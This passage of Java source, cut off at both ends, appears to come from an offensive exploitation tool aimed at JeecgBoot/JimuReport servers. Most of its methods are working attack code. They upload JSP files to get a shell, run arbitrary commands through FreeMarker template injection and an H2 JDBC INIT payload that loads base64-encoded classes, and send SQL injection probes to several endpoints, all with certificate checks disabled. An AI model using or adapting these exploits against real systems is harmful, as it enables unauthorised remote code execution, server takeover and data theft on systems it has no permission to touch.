                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            );
            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4");
            connection.setRequestProperty("Accept-Encoding", "gzip, deflate");
            String boundary = "----WebKitFormBoundaryyfyhSCMs9cajzFD4";
            String requestBody = "--"
                    + boundary
                    + "\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nqwe.png\r\n--"
                    + boundary
                    + "\r\nContent-Disposition: form-data; name=\"documentTitle\"\r\n\r\nblank\r\n--"
                    + boundary
                    + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jsp\"\r\nContent-Type: image/png\r\n\r\n"
                    + "<% out.println(\"hello,jeecg\");%>"
                    + "\r\n--"
                    + boundary
                    + "--\r\n";
            byte[] requestData = requestBody.getBytes(StandardCharsets.UTF_8);
            connection.setRequestProperty("Content-Length", String.valueOf(requestData.length));
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(requestData);
            outputStream.flush();
            outputStream.close();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
            }

            response.append(inputLine);
            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            String age = jsonObject.getString("msg");
            if (age.equals("操作成功")) {
                output.appendText(formattedDateTime + url + "上传成功\n");
                output.appendText(url + "/jeecg-boot/test.jsp");
            } else {
                output.appendText(formattedDateTime + url + "[-]上传失败\n");
            }
        } catch (Exception var23) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]上传失败-\n");
        }
    }

    public void jeecggetshelldf(String url, TextArea output) {
        try {
            HostnameVerifier hv = new HostnameVerifier() {
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            TrustManager[] trustAllCerts = new TrustManager[]{new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            URL url1 = new URL(url + "/jeecg-boot/jmreport/upload");
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)");
            connection.setRequestProperty("Accept", "*/*");
            connection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
            connection.setRequestProperty("Connection", "close");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4");
            connection.setRequestProperty("Cache-Control", "no-cache");
            connection.setRequestProperty("Pragma", "no-cache");
            connection.setDoOutput(true);
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"test.jsp\"\r\n");
            outputStream.writeBytes("Content-Type: text/html\r\n");
            outputStream.writeBytes("\r\n");
            outputStream.write("<% out.println(\"hello,jeecg\");%>".getBytes());
            outputStream.writeBytes("\r\n");
            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"fileName\"\r\n");
            outputStream.writeBytes("\r\n");
            outputStream.write("test.jsp".getBytes());
            outputStream.writeBytes("\r\n");
            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"biz\"\r\n");
            outputStream.writeBytes("\r\n");
            outputStream.write("excel_online".getBytes());
            outputStream.writeBytes("\r\n");
            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4--\r\n");
            outputStream.flush();
            outputStream.close();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            String aas = jsonObject.getString("success");
            String aas1 = jsonObject.getString("message");
            if (aas.equals("true")) {
                output.appendText(formattedDateTime + url + "上传成功\n");
                output.appendText(url + "/jeecg-boot/" + aas1);
            } else {
                output.appendText(formattedDateTime + url + "上传失败\n");
            }
        } catch (Exception var19) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "上传失败-\n");
        }
    }

    public void jeecgshelldf1(String url, TextArea output) {
        try {
            HostnameVerifier hv = new HostnameVerifier() {
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            TrustManager[] trustAllCerts = new TrustManager[]{new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            URL url1 = new URL(url + "/jmreport/upload");
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)");
            connection.setRequestProperty("Accept", "*/*");
            connection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
            connection.setRequestProperty("Connection", "close");
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4");
            connection.setRequestProperty("Cache-Control", "no-cache");
            connection.setRequestProperty("Pragma", "no-cache");
            connection.setDoOutput(true);
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"test2.jsp\"\r\n");
            outputStream.writeBytes("Content-Type: text/html\r\n");
            outputStream.writeBytes("\r\n");
            outputStream.write("<% out.println(\"hello,jeecg2\");%>".getBytes());
            outputStream.writeBytes("\r\n");
            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"fileName\"\r\n");
            outputStream.writeBytes("\r\n");
            outputStream.write("test2.jsp".getBytes());
            outputStream.writeBytes("\r\n");
            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"biz\"\r\n");
            outputStream.writeBytes("\r\n");
            outputStream.write("excel_online".getBytes());
            outputStream.writeBytes("\r\n");
            outputStream.writeBytes("------WebKitFormBoundaryyfyhSCMs9cajzFD4--\r\n");
            outputStream.flush();
            outputStream.close();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            String aas = jsonObject.getString("success");
            String aas1 = jsonObject.getString("message");
            if (aas.equals("true")) {
                output.appendText(formattedDateTime + url + "上传成功\n");
                output.appendText(url  + aas1);
            } else {
                output.appendText(formattedDateTime + url + "上传失败\n");
            }
        } catch (Exception var19) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "上传失败-\n");
        }
    }

    public void yz(String url, String cmd, TextArea output) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try {
            HostnameVerifier hv = new HostnameVerifier() {
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            TrustManager[] trustAllCerts = new TrustManager[]{new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/jeecg-boot/jmreport/queryFieldBySql");
            String json = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"" + cmd + "\\\") }' \"}";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            JSONObject result = (JSONObject)jsonObject.get("result");

            for(Object field : (JSONArray)result.get("fieldList")) {
                if (field instanceof JSONObject) {
                    JSONObject fieldObject = (JSONObject)field;
                    String fieldName = (String)fieldObject.get("fieldName");
                    output.appendText(fieldName.toString() + "\n");
                }
            }
        } catch (Exception var27) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "命令执行失败\n");
        }
    }

    public void yz1(String url, String cmd, TextArea output) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try {
            HostnameVerifier hv = new HostnameVerifier() {
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            TrustManager[] trustAllCerts = new TrustManager[]{new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/jmreport/queryFieldBySql");
            String json = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"" + cmd + "\\\") }' \"}";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            JSONObject result = (JSONObject)jsonObject.get("result");

            for(Object field : (JSONArray)result.get("fieldList")) {
                if (field instanceof JSONObject) {
                    JSONObject fieldObject = (JSONObject)field;
                    String fieldName = (String)fieldObject.get("fieldName");
                    output.appendText(fieldName.toString() + "\n");
                }
            }
        } catch (Exception var27) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "命令执行失败\n");
        }
    }

    public void jeecgcmd(String url, String cmd, TextArea output) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try {
            HostnameVerifier hv = new HostnameVerifier() {
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            TrustManager[] trustAllCerts = new TrustManager[]{new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/jeecg-boot/jmreport/testConnection");
            String json = "{\n          \"id\":\"1\",\n          \"code\":\"ABC\",\n          \"dbType\":\"MySQL\",\n          \"dbDriver\":\"org.h2.Driver\",\n          \"dbUrl\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\\\;}catch (Exception e){e.printStackTrace()\\\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\\\\\"defineClass\\\\\\\", byte[].class,int.class,int.class)\\\\;defineClassMethod.setAccessible(true)\\\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\\\;clz.newInstance()\\\\;}'\\\\;CALL EXEC('" + cmd + "')\",\n          \"dbName\":\"383BAb7deFC825E6\",\n          \"dbPassword\":\"917982\",\n          \"userName\":\"917982\"\n        }";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("cmd", cmd);
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            output.appendText(response.toString() + "\n");
        } catch (Exception var19) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "[-]命令执行失败-\n");
        }
    }

    public void jeecgcmd1(String url, String cmd, TextArea output) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try {
            HostnameVerifier hv = new HostnameVerifier() {
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            TrustManager[] trustAllCerts = new TrustManager[]{new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/jmreport/testConnection");
            String json = "{\n          \"id\":\"1\",\n          \"code\":\"ABC\",\n          \"dbType\":\"MySQL\",\n          \"dbDriver\":\"org.h2.Driver\",\n          \"dbUrl\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\\\;}catch (Exception e){e.printStackTrace()\\\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\\\\\"defineClass\\\\\\\", byte[].class,int.class,int.class)\\\\;defineClassMethod.setAccessible(true)\\\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\\\;clz.newInstance()\\\\;}'\\\\;CALL EXEC('" + cmd + "')\",\n          \"dbName\":\"383BAb7deFC825E6\",\n          \"dbPassword\":\"917982\",\n          \"userName\":\"917982\"\n        }";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("cmd", cmd);
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            output.appendText(response.toString() + "\n");
        } catch (Exception var19) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "[-]命令执行失败-\n");
        }
    }

    public void jeecgssicmd(String url, String cmd, TextArea output) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try {
            HostnameVerifier hv = new HostnameVerifier() {
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            TrustManager[] trustAllCerts = new TrustManager[]{new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/jeecg-boot/jmreport/loadTableData");
            String json = "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"" + cmd + "\\\")}'\",\"tableName\":\"test_demo);\",\"pageNo\":1,\"pageSize\":10}";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
            }

            response.append(inputLine);
            output.appendText(response.toString() + "\n");
        } catch (Exception var17) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "[-]命令执行失败-\n");
        }
    }

    public void jeecgsscmd1(String url, String cmd, TextArea output) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try {
            HostnameVerifier hv = new HostnameVerifier() {
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            TrustManager[] trustAllCerts = new TrustManager[]{new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            URL url1 = new URL(url + "/jmreport/loadTableData");
            String json = "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"" + cmd + "\\\")}'\",\"tableName\":\"test_demo);\",\"pageNo\":1,\"pageSize\":10}";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
            }

            response.append(inputLine);
            output.appendText(response.toString() + "\n");
        } catch (Exception var17) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "[-]命令执行失败-\n");
        }
    }

    public void jeecggfg(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            OkHttpClient client = new NetworkUtils().createOkHttpClient();
            Request request = new Request.Builder()
                    .url(url + "/jeecg-boot/sys/ng-alain/getDictItemsByTable/' from sys_user/*, '/x.js")
                    .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .build();

            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();

            if (responseBody.contains("create_by")) {
                output.appendText(formattedDateTime + url + "[+++]存在jeecg-boot-getDictItemsByTable-sqli注入漏洞 poc1\n");
                output.appendText(url + "/jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-getDictItemsByTable-sqli注入漏洞 poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-getDictItemsByTable-sqli注入漏洞-poc1\n");
        }
    }
    public void jeecggfg1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            OkHttpClient client = new NetworkUtils().createOkHttpClient();
            Request request = new Request.Builder()
                    .url(url + "/sys/ng-alain/getDictItemsByTable/' from sys_user/*, '/x.js")
                    .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .build();

            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();

            if (responseBody.contains("create_by")) {
                output.appendText(formattedDateTime + url + "[+++]存在jeecg-boot-getDictItemsByTable-sqli注入漏洞 poc2\n");
                output.appendText(url + "/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-getDictItemsByTable-sqli注入漏洞 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-getDictItemsByTable-sqli注入漏洞-poc2\n");
        }
    }
    public void jeecgfgdg(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            String params = "{\"apiSelectId\":\"1290104038414721025\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}";

            OkHttpClient client = new NetworkUtils().createOkHttpClient();
            RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), params);
            Request request = new Request.Builder()
                    .url(url + "/jeecg-boot/jmreport/qurestSql")
                    .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .post(requestBody)
                    .build();

            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();

            if (responseBody.contains("e10adc3949ba59abbe56e057f20f883e")) {
                output.appendText(formattedDateTime + url + "[+++]可能存在Jeecg-Boot qurestSql-SQL注入漏洞 poc1\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在Jeecg-Boot qurestSql-SQL注入漏洞 poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在Jeecg-Boot qurestSql-SQL注入漏洞-poc1\n");
        }
    }
    public void jeecgfg1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            String params = "{\"apiSelectId\":\"1290104038414721025\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}";

            OkHttpClient client = new NetworkUtils().createOkHttpClient();
            RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), params);
            Request request = new Request.Builder()
                    .url(url + "/jmreport/qurestSql")
                    .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .post(requestBody)
                    .build();

            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();

            if (responseBody.contains("e10adc3949ba59abbe56e057f20f883e")) {
